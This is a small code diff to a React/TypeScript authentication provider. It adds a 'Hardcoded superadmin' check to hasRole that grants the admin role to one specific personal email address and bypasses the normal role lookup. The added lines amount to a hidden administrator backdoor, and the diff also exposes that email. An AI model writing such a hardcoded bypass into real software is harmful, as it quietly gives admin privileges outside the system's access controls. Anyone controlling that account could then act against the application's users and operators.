@@ -118,6 +118,10 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
   };
 
   const hasRole = (role: string) => {
+    // Hardcoded superadmin
+    if (user?.email === 'paulinet77@gmail.com' && role === 'admin') {
+      return true;
+    }
     return roles.some(r => r.role === role);
   };
 
